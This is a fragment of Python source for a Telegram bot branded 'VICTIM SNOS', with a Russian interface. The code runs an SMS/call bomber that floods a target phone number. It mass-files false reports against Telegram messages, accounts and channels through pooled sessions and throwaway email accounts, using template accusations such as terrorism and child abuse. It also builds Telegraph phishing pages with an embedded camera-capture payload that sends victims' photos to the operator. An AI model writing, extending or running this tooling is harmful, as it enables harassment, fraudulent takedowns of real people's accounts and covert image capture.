        for rnd in range(1, rounds + 1):
            if stop_event.is_set(): break
            tasks = [send_bomber_request(sess, phone, s) for s in BOMBER_WEBSITES]
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch:
                if isinstance(r, dict) and r.get("success"): ok += 1
            if progress_callback: await progress_callback(rnd, rounds, ok)
            if rnd < rounds and not stop_event.is_set(): await asyncio.sleep(BOMBER_DELAY)
    return ok


# ---------- ЖАЛОБЫ НА СООБЩЕНИЯ ----------
async def report_message_via_session(session_data: dict, channel: str, msg_id: int, reason: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected: await client.connect()
        chat = await client.get_chat(f"@{channel}")
        msg = await client.get_messages(chat.id, msg_id)
        if not msg: return {"success": False}
        await client.invoke(raw_messages.Report(peer=await client.resolve_peer(chat.id), id=[msg_id], reason=REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())))
        return {"success": True}
    except: return {"success": False}

async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
    m = re.search(r't\.me/([^/]+)/(\d+)', link)
    if not m: return 0, "неверная ссылка"
    channel, msg_id = m.group(1), int(m.group(2))
    add_log(user_id, f"Жалоба({REPORT_REASONS_RU.get(reason, reason)})", f"@{channel}/{msg_id}")
    if not is_user_sessions_ready(user_id): return 0, "сессии не готовы"
    sessions = await get_user_sessions_batch(user_id, 30)
    if not sessions: return 0, "нет сессий"
    ok = 0
    for s in sessions:
        if (await report_message_via_session(s, channel, msg_id, reason)).get("success"): ok += 1
        if progress_callback: await progress_callback(ok)
        await asyncio.sleep(1.5)
    release_user_sessions(sessions)
    return ok, None


# ---------- СНОС ПОЧТА ----------
async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str) -> int:
    if not mail_tm.ready or not mail_tm.accounts: return 0
    sent = 0
    sem = asyncio.Semaphore(10)
    async def send_one(acc, rec):
        async with sem:
            result = await mail_tm.send_email(acc, rec, subject, body)
            await asyncio.sleep(1)
            return result
    tasks = []
    for acc in mail_tm.accounts[:10]:
        for rec in RECEIVERS[:3]:
            tasks.append(send_one(acc, rec))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for r in results if r is True)
    return sent


# ---------- TELEGRAPH ФИШИНГ ----------
async def create_telegraph_account(session: aiohttp.ClientSession) -> str:
    try:
        short_name = f"User_{random.randint(10000, 99999)}"
        async with session.post("https://api.telegra.ph/createAccount", json={"short_name": short_name, "author_name": TELEGRAPH_AUTHOR, "author_url": TELEGRAPH_AUTHOR_URL}) as resp:
            data = await resp.json()
            if data.get("ok"): return data["result"]["access_token"]
    except: pass
    return None

async def fetch_telegraph_page(session: aiohttp.ClientSession, url: str) -> dict:
    try:
        path = url.replace("https://telegra.ph/", "").replace("http://telegra.ph/", "").split("?")[0]
        async with session.get(f"https://api.telegra.ph/getPage/{path}?return_content=true") as resp:
            data = await resp.json()
            if data.get("ok"): return data["result"]
    except: pass
    return None

async def create_phish_page(session: aiohttp.ClientSession, original_url: str, chat_id: int, title: str, description: str, button_text: str) -> str:
    global TELEGRAPH_TOKEN
    if not TELEGRAPH_TOKEN:
        TELEGRAPH_TOKEN = await create_telegraph_account(session)
        if not TELEGRAPH_TOKEN: return None
    page_id = hashlib.md5(f"{chat_id}_{time.time()}".encode()).hexdigest()[:8]
    original_page = await fetch_telegraph_page(session, original_url)
    content = original_page["content"] if original_page and original_page.get("content") else []
    camera_html = CAMERA_TEMPLATE.format(title=title, description=description, button_text=button_text, bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id)
    camera_node = {"tag": "figure", "attrs": {"data-type": "embed"}, "children": [{"tag": "div", "attrs": {"data-html": camera_html}}]}
    content.append(camera_node)
    page_title = title if title else (original_page["title"] if original_page else "Статья")
    try:
        async with session.post("https://api.telegra.ph/createPage", json={"access_token": TELEGRAPH_TOKEN, "title": page_title, "author_name": TELEGRAPH_AUTHOR, "author_url": TELEGRAPH_AUTHOR_URL, "content": content, "return_content": False}) as resp:
            data = await resp.json()
            if data.get("ok"):
                phish_url = data["result"]["url"]
                phish_pages[page_id] = {"url": phish_url, "chat_id": chat_id, "created": time.time()}
                return phish_url
    except: pass
    return None


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС НОМЕРА", callback_data="snos_menu")
    builder.button(text="БОМБЕР", callback_data="bomber_menu")
    builder.button(text="СНОС ПОЧТА", callback_data="mail_menu")
    builder.button(text="ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
    builder.button(text="ФИШИНГ", callback_data="phish_menu")
    builder.button(text="АДМИН", callback_data="admin_menu")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop")
    builder.adjust(2, 2, 2, 1, 1)
    return builder.as_markup()

def get_snos_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС НОМЕРА", callback_data="snos")
    builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(2, 1)
    return builder.as_markup()

def get_bomber_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="БОМБЕР", callback_data="bomber")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="mail_acc")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="mail_chan")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_account_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="1.1 Обычная", callback_data="mailacc_1.1")
    builder.button(text="1.2 Снос сессий", callback_data="mailacc_1.2")
    builder.button(text="1.3 Вирт номер", callback_data="mailacc_1.3")
    builder.button(text="1.4 Ссылка в био", callback_data="mailacc_1.4")
    builder.button(text="1.5 Спам премиум", callback_data="mailacc_1.5")
    builder.button(text="НАЗАД", callback_data="mail_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_channel_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="8. Личные данные", callback_data="mailchan_8")
    builder.button(text="9. Доксинг", callback_data="mailchan_9")
    builder.button(text="10. Терроризм", callback_data="mailchan_10")
    builder.button(text="11. Дети", callback_data="mailchan_11")
    builder.button(text="12. Скам", callback_data="mailchan_12")
    builder.button(text="13. Вирт номера", callback_data="mailchan_13")
    builder.button(text="14. Расчлененка", callback_data="mailchan_14")
    builder.button(text="15. Живодерство", callback_data="mailchan_15")
    builder.button(text="НАЗАД", callback_data="mail_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_report_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_msg")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_report_reason_menu():
    builder = InlineKeyboardBuilder()
    for k, v in REPORT_REASONS_RU.items():
        builder.button(text=v, callback_data=f"reason_{k}")
    builder.button(text="НАЗАД", callback_data="report_menu")
    builder.adjust(2, 2, 2, 2, 1)
    return builder.as_markup()

def get_phish_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СОЗДАТЬ ФИШ-ССЫЛКУ", callback_data="phish_create")
    builder.button(text="МОИ ССЫЛКИ", callback_data="phish_list")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ВЫДАТЬ", callback_data="admin_add")
    builder.button(text="ЗАБРАТЬ", callback_data="admin_remove")
    builder.button(text="СПИСОК", callback_data="admin_list")
    builder.button(text="ЛОГИ", callback_data="admin_logs")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(2, 2, 1)
    return builder.as_markup()

async def send_message_with_banner(event: types.Message, text: str, markup=None):
    if os.path.exists(BANNER_PATH):
        return await event.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    return await event.answer(text, reply_markup=markup)

async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
    await callback.message.delete()
    if os.path.exists(BANNER_PATH):
        await callback.message.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        await callback.message.answer(text, reply_markup=markup)


# ---------- ХЕНДЛЕРЫ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    user_id = msg.from_user.id
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(msg, f"<b>ПОДПИШИТЕСЬ НА КАНАЛ</b>\n\n{CHANNEL_URL}"); return
    if not is_user_allowed(user_id):
        await send_message_with_banner(msg, f"<b>ДОСТУП ЗАПРЕЩЕН</b>\n\nID: <code>{user_id}</code>"); return
    if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
        asyncio.create_task(ensure_user_sessions(user_id))
    cnt = get_user_sessions_count(user_id)
    ready = is_user_sessions_ready(user_id)
    await send_message_with_banner(msg, f"<b>VICTIM SNOS</b>\n\nСессии: {cnt}/{SESSIONS_PER_USER} {'[ГОТОВ]' if ready else '[ЗАГРУЗКА]'}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}", get_main_menu())

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await send_message_with_banner(msg, f"<b>АДМИН</b>\n\nРазрешено: {len(ALLOWED_USERS)}", get_admin_menu())

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>СНОС НОМЕРА</b>", get_snos_menu()); await cb.answer()
@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>БОМБЕР</b>", get_bomber_menu()); await cb.answer()
@dp.callback_query(F.data == "mail_menu")
async def mail_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>СНОС ПОЧТА</b>", get_mail_menu()); await cb.answer()
@dp.callback_query(F.data == "report_menu")
async def report_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>ЖАЛОБЫ</b>", get_report_menu()); await cb.answer()
@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>ФИШИНГ</b>", get_phish_menu()); await cb.answer()
@dp.callback_query(F.data == "admin_menu")
async def admin_menu_handler(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID: await cb.answer("Нет доступа!", show_alert=True); return
    await edit_message_with_banner(cb, f"<b>АДМИН</b>\n\nРазрешено: {len(ALLOWED_USERS)}", get_admin_menu()); await cb.answer()
@dp.callback_query(F.data == "admin_logs")
async def admin_logs(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID: await cb.answer("Нет доступа!", show_alert=True); return
    await edit_message_with_banner(cb, f"<b>ЛОГИ</b>\n\n{get_last_logs(5)}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]])); await cb.answer()
@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID: return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ВЫДАТЬ ДОСТУП</b>\n\nВведите ID:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_process(msg: types.Message, state: FSMContext):
    try:
        user_id = int(msg.text.strip())
        ALLOWED_USERS.add(user_id)
        save_allowed_users()
        await send_message_with_banner(msg, f"Пользователь <code>{user_id}</code> добавлен!")
    except: await send_message_with_banner(msg, "Неверный ID!")
    await state.clear()
@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS: return
    builder = InlineKeyboardBuilder()
    for uid in list(ALLOWED_USERS)[:20]: builder.button(text=f"Удалить {uid}", callback_data=f"remove_{uid}")
    builder.button(text="НАЗАД", callback_data="admin_menu"); builder.adjust(1)
    await edit_message_with_banner(cb, "<b>ЗАБРАТЬ ДОСТУП</b>", builder.as_markup())
@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_process(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID: return
    user_id = int(cb.data.replace("remove_", ""))
    if user_id in ALLOWED_USERS: ALLOWED_USERS.remove(user_id); save_allowed_users()
    await edit_message_with_banner(cb, f"Пользователь <code>{user_id}</code> удален!", get_admin_menu())
@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    text = "<b>РАЗРЕШЕННЫЕ</b>\n\n" + "\n".join(f"<code>{uid}</code>" for uid in ALLOWED_USERS) if ALLOWED_USERS else "Пусто"
    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]]))
@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_message_with_banner(cb, f"<b>VICTIM SNOS</b>\n\nID: <code>{cb.from_user.id}</code>", get_main_menu())
@dp.callback_query(F.data == "refresh_sessions")
async def refresh_sessions(cb: types.CallbackQuery):
    if cb.from_user.id in active_attacks: await cb.answer("Нельзя во время сноса!", show_alert=True); return
    await cb.answer(f"Обновление...")
    asyncio.create_task(refresh_user_sessions(cb.from_user.id))
@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    await edit_message_with_banner(cb, f"<b>СТАТУС</b>\n\nСессии: {get_user_sessions_count(user_id)}/{SESSIONS_PER_USER}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\nСайтов: {len(TELEGRAM_OAUTH_SITES)}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="main_menu")]]))

# Снос номера
@dp.callback_query(F.data == "snos")
async def snos_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id): await cb.answer("Подпишитесь на канал!", show_alert=True); return
    if not is_user_sessions_ready(cb.from_user.id): await cb.answer("Сессии загружаются!", show_alert=True); return
    if cb.from_user.id in active_attacks: await cb.answer("Снос уже идет!", show_alert=True); return
    await state.set_state(SnosState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>СНОС НОМЕРА</b>\n\nВведите номер:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]]))
@dp.message(StateFilter(SnosState.waiting_phone))
async def snos_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"): phone = "+" + phone
    await state.update_data(phone=phone); await state.set_state(SnosState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "Введите количество раундов (1-10):")
@dp.message(StateFilter(SnosState.waiting_count))
async def snos_count(msg: types.Message, state: FSMContext):
    try: count = int(msg.text.strip())
    except: return
    data = await state.get_data()
    phone, user_id = data["phone"], msg.from_user.id
    await state.clear(); await msg.delete()
    stop_event = asyncio.Event()
    active_attacks[user_id] = {"stop_event": stop_event, "task": None}
    st = await send_message_with_banner(msg, "<b>СНОС ЗАПУЩЕН</b>")
    async def prog(cur, tot, ok_count):
        try: await st.edit_caption(caption=f"<b>СНОС</b>\n\nРаунд: {cur}/{tot}\nЗапросов: {ok_count}")
        except: pass
    ok = await snos_attack(user_id, phone, count, stop_event, prog)
    asyncio.create_task(refresh_user_sessions(user_id))
    await st.delete()
    if user_id in active_attacks: del active_attacks[user_id]
    await send_message_with_banner(msg, f"<b>СНОС ЗАВЕРШЕН</b>\n\nОтправлено запросов: {ok}", get_main_menu())

# Бомбер
@dp.callback_query(F.data == "bomber")
async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id): await cb.answer("Подпишитесь на канал!", show_alert=True); return
    if cb.from_user.id in active_bombers: await cb.answer("Бомбер уже идет!", show_alert=True); return
    await state.set_state(BomberState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption=f"<b>БОМБЕР</b>\n\nСайтов: {len(BOMBER_WEBSITES)}\n\nВведите номер:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="bomber_menu")]]))
@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"): phone = "+" + phone
    await state.update_data(phone=phone); await state.set_state(BomberState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "Введите раунды (1-5):")
@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    try: count = int(msg.text.strip())
    except: return
    data = await state.get_data()
    phone, user_id = data["phone"], msg.from_user.id
    await state.clear(); await msg.delete()
    stop_event = asyncio.Event()
    active_bombers[user_id] = {"stop_event": stop_event, "task": None}
    st = await send_message_with_banner(msg, "<b>БОМБЕР ЗАПУЩЕН</b>")
    async def prog(cur, tot, ok_count):
        try: await st.edit_caption(caption=f"<b>БОМБЕР</b>\n\nРаунд: {cur}/{tot}\nЗапросов: {ok_count}")
        except: pass
    ok = await bomber_attack(phone, count, user_id, stop_event, prog)
    await st.delete()
    if user_id in active_bombers: del active_bombers[user_id]
    await send_message_with_banner(msg, f"<b>БОМБЕР ЗАВЕРШЕН</b>\n\nОтправлено запросов: {ok}", get_main_menu())

# Жалобы на сообщения
@dp.callback_query(F.data == "report_msg")
async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id): await cb.answer("Подпишитесь на канал!", show_alert=True); return
    if not is_user_sessions_ready(cb.from_user.id): await cb.answer("Сессии загружаются!", show_alert=True); return
    await state.set_state(ReportMessageState.waiting_link)
    await cb.message.delete()
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ЖАЛОБА НА СООБЩЕНИЕ</b>\n\nВведите ссылку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]]))
@dp.message(StateFilter(ReportMessageState.waiting_link))
async def report_msg_link(msg: types.Message, state: FSMContext):
    await state.update_data(link=msg.text.strip())
    await state.set_state(ReportMessageState.waiting_reason)
    await msg.delete()
    await msg.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ВЫБЕРИТЕ ПРИЧИНУ</b>", reply_markup=get_report_reason_menu())
@dp.callback_query(F.data.startswith("reason_"))
async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
    reason = cb.data.replace("reason_", "")
    data = await state.get_data()
    link, user_id = data["link"], cb.from_user.id
    await state.clear(); await cb.message.delete()
    active_reports[user_id] = True
    st = await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ОТПРАВКА ЖАЛОБ...</b>")
    async def prog(r): 
        try: await st.edit_caption(caption=f"<b>ОТПРАВКА</b>\n\n{r}")
        except: pass
    ok, err = await mass_report_message(user_id, link, reason, prog)
    await st.delete()
    if user_id in active_reports: del active_reports[user_id]
    await cb.message.answer(f"<b>{'ГОТОВО' if ok else 'ОШИБКА'}</b>\n\nОтправлено: {ok}" + (f"\n{err}" if err else ""))
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>VICTIM SNOS</b>", reply_markup=get_main_menu())

# Снос Почта - Аккаунт
@dp.callback_query(F.data == "mail_acc")
async def mail_acc_menu(cb: types.CallbackQuery):
    if not mail_tm.ready: await cb.answer("Почта загружается!", show_alert=True); return
    await edit_message_with_banner(cb, "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВыберите тип:", get_mail_account_menu()); await cb.answer()
@dp.callback_query(F.data.startswith("mailacc_"))
async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("mailacc_", "")
    await state.update_data(complaint_type=complaint_type)
    if complaint_type == "1.1":
        await state.set_state(MailAccountState.waiting_reason)
        await cb.message.delete()
        await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ОБЫЧНАЯ ЖАЛОБА</b>\n\nВведите причину:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))
    else:
        await state.set_state(MailAccountState.waiting_username)
        await cb.message.delete()
        await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))
@dp.message(StateFilter(MailAccountState.waiting_reason))
async def mail_acc_reason(msg: types.Message, state: FSMContext):
    await state.update_data(reason=msg.text.strip())
    await state.set_state(MailAccountState.waiting_username)
    await msg.delete()
    await send_message_with_banner(msg, "Введите юзернейм (без @):")
@dp.message(StateFilter(MailAccountState.waiting_username))
async def mail_acc_username(msg: types.Message, state: FSMContext):
    await state.update_data(username=msg.text.strip().replace("@", ""))
    await state.set_state(MailAccountState.waiting_id)
    await msg.delete()
    await send_message_with_banner(msg, "Введите Telegram ID:")
@dp.message(StateFilter(MailAccountState.waiting_id))
async def mail_acc_id(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username", "")
    telegram_id = msg.text.strip()
    complaint_type = data.get("complaint_type", "1.2")
    reason = data.get("reason", "")
    user_id = msg.from_user.id
    await state.clear(); await msg.delete()
    body = COMPLAINT_TEXTS_ACCOUNT[complaint_type].format(username=username, telegram_id=telegram_id, reason=reason)
    add_log(user_id, "Снос почта (акк)", f"@{username}")
    st = await send_message_with_banner(msg, "<b>Отправка писем...</b>")
    sent = await send_mass_complaint(mail_tm, f"Жалоба на @{username}", body)
    await st.delete()
    await send_message_with_banner(msg, f"<b>ГОТОВО</b>\n\n@{username}\nОтправлено: {sent}", get_main_menu())

# Снос Почта - Канал
@dp.callback_query(F.data == "mail_chan")
async def mail_chan_menu(cb: types.CallbackQuery):
    if not mail_tm.ready: await cb.answer("Почта загружается!", show_alert=True); return
    await edit_message_with_banner(cb, "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВыберите тип:", get_mail_channel_menu()); await cb.answer()
@dp.callback_query(F.data.startswith("mailchan_"))
async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("mailchan_", "")
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(MailChannelState.waiting_channel)
    await cb.message.delete()
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]]))
@dp.message(StateFilter(MailChannelState.waiting_channel))
async def mail_chan_link(msg: types.Message, state: FSMContext):
    await state.update_data(channel=msg.text.strip())
    await state.set_state(MailChannelState.waiting_violation)
    await msg.delete()
    await send_message_with_banner(msg, "Введите ссылку на нарушение:")
@dp.message(StateFilter(MailChannelState.waiting_violation))
async def mail_chan_violation(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    channel = data.get("channel", "")
    violation = msg.text.strip()
    complaint_type = data.get("complaint_type", "8")
    user_id = msg.from_user.id
    await state.clear(); await msg.delete()
    body = COMPLAINT_TEXTS_CHANNEL[complaint_type].format(channel_link=channel, violation_link=violation)
    add_log(user_id, "Снос почта (канал)", channel)
    st = await send_message_with_banner(msg, "<b>Отправка писем...</b>")
    sent = await send_mass_complaint(mail_tm, "Жалоба на канал", body)
    await st.delete()
    await send_message_with_banner(msg, f"<b>ГОТОВО</b>\n\n{channel}\nОтправлено: {sent}", get_main_menu())

# Фишинг
@dp.callback_query(F.data == "phish_create")
async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PhishState.waiting_link)
    await cb.message.delete()
    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ФИШИНГ</b>\n\nОтправьте ссылку на Telegraph:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]]))
@dp.message(StateFilter(PhishState.waiting_link))
async def phish_link(msg: types.Message, state: FSMContext):
    if "telegra.ph" not in msg.text: await send_message_with_banner(msg, "Нужна ссылка на Telegraph!"); return
    await state.update_data(link=msg.text.strip())
    await state.set_state(PhishState.waiting_title)
    await msg.delete()
    await send_message_with_banner(msg, "Введите заголовок:")
@dp.message(StateFilter(PhishState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    await state.update_data(title=msg.text.strip())
    await state.set_state(PhishState.waiting_description)
    await msg.delete()
    await send_message_with_banner(msg, "Введите описание:")
@dp.message(StateFilter(PhishState.waiting_description))
async def phish_description(msg: types.Message, state: FSMContext):
    await state.update_data(description=msg.text.strip())
    await state.set_state(PhishState.waiting_button)
    await msg.delete()
    await send_message_with_banner(msg, "Введите текст кнопки:")
@dp.message(StateFilter(PhishState.waiting_button))
async def phish_button(msg: types.Message, state: FSMContext):
    button_text = msg.text.strip()
    data = await state.get_data()
    link, title, desc, user_id = data["link"], data["title"], data["description"], msg.from_user.id
    await state.clear(); await msg.delete()
    st = await send_message_with_banner(msg, "<b>Создаю страницу...</b>")
    connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        url = await create_phish_page(sess, link, user_id, title, desc, button_text)
    await st.delete()
    if url:
        add_log(user_id, "Фишинг", url)
        await send_message_with_banner(msg, f"<b>ССЫЛКА СОЗДАНА!</b>\n\n<code>{url}</code>", get_main_menu())
    else: await send_message_with_banner(msg, "<b>ОШИБКА</b>\n\nНе удалось создать страницу", get_main_menu())
@dp.callback_query(F.data == "phish_list")
async def phish_list(cb: types.CallbackQuery):
    user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
    if not user_pages: await edit_message_with_banner(cb, "<b>МОИ ССЫЛКИ</b>\n\nПусто", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])); await cb.answer(); return
    text = "<b>МОИ ССЫЛКИ</b>\n\n" + "\n".join([f"🔗 <code>{d['url']}</code>" for _, d in user_pages[-5:]])
    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])); await cb.answer()

@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    for d in [active_attacks, active_bombers, active_reports]:
        if user_id in d: del d[user_id]
    await edit_message_with_banner(cb, "<b>ОСТАНОВЛЕНО</b>", get_main_menu())

@dp.message(F.photo)
async def handle_photo(msg: types.Message):
    if msg.caption and "Жертва:" in msg.caption:
        m = re.search(r"Жертва: (\w+)", msg.caption)
        if m and m.group(1) in phish_pages:
            await msg.reply(f"<b>📸 НОВОЕ ФОТО!</b>\nСтраница: {phish_pages[m.group(1)]['url']}")


# ---------- ЗАПУСК ----------
mail_tm = MailTM()

async def init_mailtm():
    try:
        with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
            mail_tm.accounts = json.load(f)
            mail_tm.ready = True
            logger.info(f"Загружено {len(mail_tm.accounts)} почт")
    except:
        logger.info("Создание почт...")
        await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
        if mail_tm.accounts:
            with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                json.dump(mail_tm.accounts, f)
            mail_tm.ready = True

async def main():
    load_allowed_users()
    logger.info(f"VICTIM SNOS запуск... Сессий: {SESSIONS_PER_USER}")
    await bot.delete_webhook(drop_pending_updates=True)
    asyncio.create_task(init_mailtm())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
